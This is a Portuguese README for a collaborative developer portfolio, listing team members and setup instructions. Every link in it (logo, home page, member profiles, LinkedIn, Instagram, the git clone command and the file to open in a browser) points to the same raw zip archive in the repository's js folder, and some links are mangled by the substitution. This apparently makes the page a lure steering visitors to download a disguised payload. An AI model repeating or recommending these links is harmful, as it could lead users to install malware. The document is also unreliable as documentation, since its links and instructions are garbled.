...
![Logo N1 Virtual Studio](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip)
...
O portfólio é uma plataforma interativa que serve como vitrine para os talentos dos nossos desenvolvedores. A página inicial (`https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip`) oferece uma experiência visual dinâmica, permitindo aos visitantes explorar os perfis individuais de cada membro da equipe, onde encontrarão informações detalhadas sobre suas especialidades, projetos e formas de contato.
...
*   **João Schweitzer**
    ...
    *   **Perfil**: [Página de João Schweitzer](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip)
    *   **LinkedIn**: [João Schweitzer](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zipão-schweitzer?trk=people-guest_people_search-card)
    *   **Instagram**: [https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip)
...
*   **Veperxz**
    ...
    *   **Perfil**: [Página de Veperxz](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip)
    *   **Instagram**: [https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip](https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip)
...
1.  **Clone o repositório**:
    ```bash
    git clone https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip
    ```
...
3.  **Abra o arquivo `https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip`**:
    Simplesmente abra o arquivo `https://github.com/Gs-gimenez/Portifolio-Colaborativo/raw/refs/heads/main/js/Colaborativo_Portifolio_3.0.zip` em seu navegador web preferido (Google Chrome, Mozilla Firefox, etc.). Não é necessário um servidor web para a visualização básica.
